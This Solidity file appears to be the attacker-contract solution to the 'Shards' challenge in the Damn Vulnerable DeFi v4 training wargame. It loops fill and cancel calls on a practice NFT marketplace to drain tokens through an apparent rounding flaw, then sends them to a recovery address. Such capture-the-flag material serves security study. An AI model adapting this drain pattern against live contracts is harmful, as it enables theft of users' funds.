// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ShardsNFTMarketplace} from "../ShardsNFTMarketplace.sol";
import {DamnValuableToken} from "../../DamnValuableToken.sol";

contract AttackShardsNFTMarketplace {
    uint64 public constant OFFER_ID = 1;
    DamnValuableToken public immutable token;
    ShardsNFTMarketplace public immutable marketplace;
    address public immutable recovery;

    constructor(address marketplaceAddress, address tokenAddress, address recoveryAddress) {
        token = DamnValuableToken(tokenAddress);
        marketplace = ShardsNFTMarketplace(marketplaceAddress);
        recovery = recoveryAddress;
    }

    function attack() external {
        uint64 purchaseIndex = 0;
        uint256 initialMarketplaceBalance = token.balanceOf(address(marketplace));
        uint256 missingTokens = 0;
        while (missingTokens < initialMarketplaceBalance * 1e16 / 100e18) {
            marketplace.fill(OFFER_ID, 133);
            marketplace.cancel(OFFER_ID, purchaseIndex);
            purchaseIndex++;
            missingTokens = initialMarketplaceBalance - token.balanceOf(address(marketplace));
        }

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
